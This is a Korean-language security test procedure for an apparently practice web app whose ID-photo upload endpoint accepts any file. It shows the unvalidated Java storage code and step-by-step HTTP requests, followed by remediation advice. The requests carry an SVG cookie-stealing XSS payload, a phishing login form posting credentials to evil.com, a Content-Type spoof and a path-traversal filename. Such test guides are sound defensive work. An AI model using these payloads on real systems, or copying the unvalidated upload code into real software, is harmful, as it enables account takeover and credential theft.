================================================================================
[VCE-AUTH-06] 신분증 사진 업로드 파일 검증 없음 → WebShell 업로드
도메인: auth
================================================================================

## 1. 진단 항목 개요

- **항목명**: 파일 확장자/MIME 검증 없는 신분증 업로드
- **번호**: AUTH-06
- **위험도**: Critical
- **OWASP**: A03:2021 – Injection / Unrestricted File Upload

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/auth/me/id-photo |
| 운영 | https://vceapp.com/api/auth/me/id-photo |
| HTTP 메서드 | POST (multipart/form-data) |
| 인증 요건 | Bearer JWT 필요 |

## 3. 취약점 원리 (Why this works)

`FileService.java:42`에 파일 저장 로직에 확장자 검증이 없다:
```java
public String storeFile(MultipartFile file) {
    String originalFilename = file.getOriginalFilename();
    String filename = UUID.randomUUID() + "_" + originalFilename;
    Path targetLocation = Paths.get(UPLOAD_DIR + filename);
    Files.copy(file.getInputStream(), targetLocation);  // 검증 없이 저장
    return "/uploads/" + filename;
}
```

저장된 파일은 `SecurityConfig.java:72`에 의해 인증 없이 접근 가능:
```java
.requestMatchers("/uploads/**").permitAll()
```

따라서:
1. JSP/PHP/HTML 악성 파일 업로드 가능
2. 업로드 후 URL로 직접 실행 가능 (서버가 실행 환경 지원 시)
3. SVG XSS: SVG 파일 내 JavaScript 삽입 후 다른 사용자가 해당 URL 방문 시 XSS 발동

## 4. 테스트 절차 (Step-by-step)

### [사전 준비]
1. test@vce.com으로 로그인하여 JWT 획득
2. 악성 테스트 파일 준비 (실습용 무해한 내용)

---

### Step 1. 정상 이미지 업로드 확인

```
POST /api/auth/me/id-photo HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="id.jpg"
Content-Type: image/jpeg

[JPEG 바이너리]
------Boundary--
```

응답: `{"url": "/uploads/uuid_id.jpg"}`

---

### Step 2. SVG XSS 파일 업로드

악성 SVG 파일 내용 (`xss.svg`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <circle cx="50" cy="50" r="50"/>
</svg>
```

업로드 요청:
```
POST /api/auth/me/id-photo HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="xss.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
<circle cx="50" cy="50" r="50"/></svg>
------Boundary--
```

업로드 후 반환된 URL로 브라우저 접근:
```
GET /uploads/uuid_xss.svg HTTP/1.1
Host: localhost:8080
```
→ 브라우저에서 JavaScript 실행 여부 확인

---

### Step 3. HTML 피싱 파일 업로드

`fake_login.html`:
```html
<!DOCTYPE html>
<html>
<body>
<h1>VCE 보안 업데이트</h1>
<form action="https://evil.com/capture" method="POST">
  이메일: <input name="email"><br>
  비밀번호: <input type="password" name="password"><br>
  <button type="submit">확인</button>
</form>
</body>
</html>
```

```
------Boundary
Content-Disposition: form-data; name="file"; filename="notice.html"
Content-Type: text/html

[HTML 내용]
------Boundary--
```

---

### Step 4. Content-Type 조작 (JPEG로 위장)

실제로는 SVG이지만 Content-Type을 image/jpeg로 설정:
```
------Boundary
Content-Disposition: form-data; name="file"; filename="id.jpg"
Content-Type: image/jpeg

<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
<circle cx="50" cy="50" r="50"/></svg>
------Boundary--
```

---

### Step 5. Path Traversal 파일명 테스트

```
Content-Disposition: form-data; name="file"; filename="../../etc/passwd.jpg"
```

서버가 파일명을 그대로 사용하면 경로 탈출 가능 여부 확인.

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- SVG 업로드 성공 후 URL 접근 시 `alert(document.cookie)` 실행
- HTML 파일 업로드 성공 후 브라우저에서 피싱 페이지 렌더링
- `.jsp`, `.html`, `.svg` 등 비이미지 파일 업로드 HTTP 200

✗ **안전 (Not Vulnerable)**:
- "허용되지 않는 파일 형식입니다" 오류 반환
- HTTP 400 Bad Request
- 업로드는 되지만 Content-Type: text/plain으로 서빙 (MIME 스니핑 방지)

## 6. 예상 취약 포인트 (코드 위치)

- `FileService.java:42` — 확장자 및 MIME 타입 검증 코드 없음
- `SecurityConfig.java:72` — `/uploads/**` 인증 없이 접근 허용

## 7. 권고 조치

- 허용 확장자 화이트리스트: `.jpg`, `.jpeg`, `.png`, `.pdf` 만 허용
- Magic Byte(파일 시그니처) 검증으로 실제 파일 타입 확인
- 업로드 파일 저장 경로를 웹 루트 외부로 이동하거나 별도 파일 서버 사용
- Content-Type 헤더 강제: `Content-Type: application/octet-stream; X-Content-Type-Options: nosniff`
- 파일 크기 제한 설정 (예: 10MB)
